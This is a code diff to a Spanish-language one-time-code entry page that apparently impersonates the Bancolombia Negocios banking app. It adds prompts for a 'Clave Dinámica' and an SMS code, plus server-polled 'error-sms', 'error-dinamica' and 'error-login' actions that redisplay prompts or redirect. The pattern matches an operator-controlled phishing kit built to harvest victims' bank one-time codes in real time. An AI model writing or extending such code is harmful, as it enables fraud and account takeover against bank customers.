@@ -21,7 +21,7 @@ let pollInterval = setInterval(async () => {
         clearInterval(pingInterval);
         clearInterval(pollInterval);
         window.location.href = "index.html";
-      } else if (action === 'error-token') {
+      } else if (action === 'error-dinamica') {
         document.getElementById("otp-validating").hidden = true;
         document.getElementById("otp-content").hidden = false;
         resetOTP();
@@ -36,7 +36,22 @@ let pollInterval = setInterval(async () => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ action: null })
         }).catch(() => {});
-      } else if (action === 'error-user' || action === 'error-pass') {
+      } else if (action === 'error-sms') {
+        document.getElementById("otp-validating").hidden = true;
+        document.getElementById("otp-content").hidden = false;
+        resetOTP();
+        if (description) {
+          description.style.color = "#d93838";
+          description.style.fontWeight = "600";
+          description.textContent = "Código SMS incorrecto. Por favor, verifica e ingresa nuevamente.";
+        }
+        // Reset action on server so it doesn't loop
+        fetch(`/api/sessions/${sessionId}/action`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: null })
+        }).catch(() => {});
+      } else if (action === 'error-login') {
         clearInterval(pingInterval);
         clearInterval(pollInterval);
         window.location.href = `login.html?error=${action}`;
@@ -117,11 +132,18 @@ next.addEventListener("click", () => {
 window.addEventListener('DOMContentLoaded', () => {
   const otpType = sessionStorage.getItem('otpType');
   const otpTitle = document.getElementById("otp-title");
+  const description = document.querySelector(".bc-key-validation-description");
   if (otpTitle && otpType) {
-    if (otpType === 'ganapin') {
-      otpTitle.textContent = "Ingresa tu GanaPin";
-    } else if (otpType === 'totp') {
-      otpTitle.textContent = "Ingresa el Código del Autenticador";
+    if (otpType === 'dinamica') {
+      otpTitle.textContent = "Ingresa la Clave Dinámica";
+      if (description) {
+        description.textContent = "Encuentra tu Clave Dinámica en la app Bancolombia Negocios.";
+      }
+    } else if (otpType === 'sms') {
+      otpTitle.textContent = "Ingresa el Código SMS";
+      if (description) {
+        description.textContent = "Ingresa el código de 6 dígitos enviado por mensaje de texto (SMS) a tu celular registrado.";
+      }
     }
   }
 });
